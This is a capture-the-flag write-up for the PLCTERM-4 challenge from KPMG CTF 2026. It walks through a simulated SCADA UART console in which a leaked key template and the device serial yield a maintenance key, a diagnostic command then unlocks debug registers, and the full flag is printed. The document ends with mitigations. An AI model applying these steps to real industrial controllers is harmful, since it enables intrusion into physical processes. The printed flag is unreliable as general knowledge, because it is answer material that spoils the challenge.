---
link: 'writeups/kpmg-ctf-2026/plcterm-4'
title: "PLCTERM-4 - KPMG CTF 2026"
description: "Writeup for PLCTERM-4 from KPMG CTF 2026. Exploiting an exposed SCADA UART maintenance console, deriving service keys from device telemetry, and extracting flag chunks from diagnostic registers."
date: 2026-10-25 11:52:00
categories:
  - [Writeups, KPMG CTF 2026]
tags:
  - KPMG-CTF-2026
  - OT
  - SCADA
  - Hardware / Embedded
  - PLC
---

# KPMG CTF 2026 - PLCTERM-4

---

## Challenge Description

> An industrial control system operator console was exposed to the network. Connect to the terminal interface, inspect device memory, and recover the restricted maintenance diagnostic data.

---

## Step 1 - Connecting to the Web UART Console

The provided challenge endpoint was hosted at:

```text
http://0.cloud.chals.io:30877
```

Loading the endpoint greeted us with a web-based UART command interface for a PLCTERM-4 industrial terminal, exposing commands such as `sysinfo`, `status`, `mem`, `diag`, `auth`, and `read`.

---

## Step 2 - Inspecting System Telemetry and Memory Layout

We ran `sysinfo`, `status`, and `mem` to inspect hardware specifications and register ranges:

```text
root@plc4:~$ sysinfo

  DEVICE    : PLCTERM-4 / SCADA-7 Node
  FIRMWARE  : 2.3.1-OT (Build 20240307)
  CPU       : ARM Cortex-M4 @ 168 MHz
  REGISTERS : 0x00 - 0x7F
  UART      : 115200 8N1
  SERIAL    : SN-7743-ALPHA
  MAINT     : LOCKED

root@plc4:~$ status

  Coil 0x01 : ON   Motor-A
  Coil 0x02 : OFF  Valve-B
  Reg  0x10 : 0x00A4  (pressure 164 PSI)
  Reg  0x12 : 0x0031  (temp sensor, raw)
  Reg  0x40 : 0x0001  (controller state: RUN)
  Reg  0x42 : 0x0231  (firmware build id)
  Reg  0x45 : 0x47F6  (UART RX counter)
  Reg  0x4D-0x4F : [LOCKED - maintenance/debug]

root@plc4:~$ mem

  0x00-0x0F  System control
  0x10-0x1F  Sensor inputs
  0x20-0x2F  Coil outputs
  0x40-0x49  Runtime telemetry
  0x4A-0x4C  Reserved
  0x4D-0x4F  Maintenance/debug [LOCKED]
  0x50-0x7F  User config
```

![Console sysinfo, status, and mem commands](/img/posts/kpmg-ctf-2026-91_ot_plcterm_sysinfo.webp)

Notice that registers `0x4D` through `0x4F` were labeled `[LOCKED - maintenance/debug]`. Attempting to read `0x4D` directly resulted in access denied.

However, register `0x48` in the telemetry range was readable without authentication:

```text
root@plc4:~$ read 0x48
LEGACY_SERVICE_KEY: MAINT-<UNIT>
```

From `sysinfo`, the device serial was `SN-7743-ALPHA`. The unit number was `7743`, giving us the candidate service key:

```text
MAINT-7743
```

---

## Step 3 - Authenticating and Unlocking Debug Registers

Submitting the service key with `auth`:

```text
root@plc4:~$ auth MAINT-7743
[AUTH] Key accepted. Session elevated.
```

The session was now elevated to maintenance mode. Attempting to immediately read register `0x4D` returned:

```text
root@plc4:~$ read 0x4D
[READ] 0x4D: LOCKED - run diag sequence first.
```

Running the diagnostic routine with full verbose flags:

```text
root@plc4:~$ diag --verbose --raw

[DIAG] Running full diagnostic...
[DIAG] 0x01 .. CPU core integrity  PASS
[DIAG] 0x02 .. Flash checksum      PASS
[DIAG] 0x10 .. Pressure register   PASS
[DIAG] 0x12 .. Temp register       PASS
[DIAG] 0x4D .. Debug buffer A      UNLOCKED
[DIAG] 0x4E .. Debug buffer B      UNLOCKED
[DIAG] 0x4F .. Debug buffer C      UNLOCKED
[DIAG] Done. Maintenance/debug range accessible.
```

The diagnostic test unlocked Debug buffers A, B, and C.

---

## Step 4 - Dumping the Flag from Debug Buffers

With the debug range unlocked, we read registers `0x4D`, `0x4E`, and `0x4F`:

```text
root@plc4:~$ read 0x4D
[READ] Register 0X4D - DEBUG BUFFER A
[READ] Raw: 4B 50 4D 47 5F 43 54 46 7B 57 44 71 44 6A 77 73 32 69
[READ] Data: KPMG_CTF{WDqDjws2i

root@plc4:~$ read 0x4E
[READ] Register 0X4E - DEBUG BUFFER B
[READ] Raw: 2D 76 47 32 74 4D 44 4A 4B 37 59 4B 38 72 39 70 58 63
[READ] Data: -vG2tMDJK7YK8r9pXc

root@plc4:~$ read 0x4F
[READ] Register 0X4F - DEBUG BUFFER C
[READ] Raw: 6A 36 53 4D 32 53 51 5A 72 76 68 68 4D 66 31 58 66 7D
[READ] Data: j6SM2SQZrvhhMf1Xf}
```

![Authentication and reading debug registers](/img/posts/kpmg-ctf-2026-92_ot_plcterm_flag.webp)

Joining the three register chunks together produced the full flag.

---

## Flag

```plain
KPMG_CTF{WDqDjws2i-vG2tMDJK7YK8r9pXcj6SM2SQZrvhhMf1Xf}
```

---

## Mitigations

| Vulnerability | Fix |
|---|---|
| Unauthenticated Key Format Leak | Remove legacy diagnostic hints and service key patterns from readable telemetry registers |
| Weak Serial-Derived Credentials | Implement strong cryptographic key exchanges or centralized authentication rather than predictable unit serial keys |
| Exposed Operational Interfaces | Segment OT and SCADA serial-over-IP interfaces behind dedicated VPNs and industrial firewalls |

---

## Summary

The challenge simulated an operational technology UART maintenance console. By inspecting unauthenticated registers, we located a legacy service key format template that referenced the device's serial number. Authenticating with `MAINT-7743` and executing the hardware diagnostic routine unlocked three restricted memory buffers containing the flag.
